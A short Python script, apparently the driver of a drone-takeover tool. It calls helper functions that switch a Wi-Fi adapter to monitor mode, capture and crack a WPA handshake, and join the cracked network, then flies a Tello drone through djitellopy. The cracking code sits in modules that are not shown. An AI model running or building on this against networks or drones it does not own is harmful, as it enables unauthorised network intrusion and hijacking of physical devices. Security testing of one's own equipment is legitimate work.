import time
import os
from djitellopy import Tello
from ConnectCrackedNetwork import connect_to_cracked_network
from MonitorMode import switch_monitor_mode
from WPA_Handshake import wpa_capture_password_cracking
from RestartNetwork import restart_network_services


def take_flight_control():
    """
    Take control of a Tello drone for testing purposes.
    """
    # Switch network adapter to monitor mode
    switch_monitor_mode()

    # Capture WPA handshake for password cracking
    wpa_capture_password_cracking()

    # Restart network services
    restart_network_services()

    # Connect to a cracked network
    connect_to_cracked_network()

    # Initialize Tello drone object
    tello = Tello()

    # Connect to Tello drone
    tello.connect()

    # Start video stream from Tello drone
    tello.streamon()

    # Display the current battery level of the Tello drone
    print("Your Drone battery is: " + str(tello.get_battery()) + "%")

    # Check for active connections on port 11111
    os.system('netstat -anp | grep "11111"')

    # Start video playback from the Tello drone
    os.system("ffplay udp://@:11111 &")

    # Takeoff the Tello drone
    tello.takeoff()

    # Move the Tello drone forward
    tello.send_rc_control(0, 10, 0, 0)
    time.sleep(2)

    # Rotate the Tello drone to the right
    tello.send_rc_control(0, 10, 0, 30)
    time.sleep(2)

    # Stop moving the Tello drone
    tello.send_rc_control(0, 0, 0, 0)

    # Land the Tello drone
    tello.land()
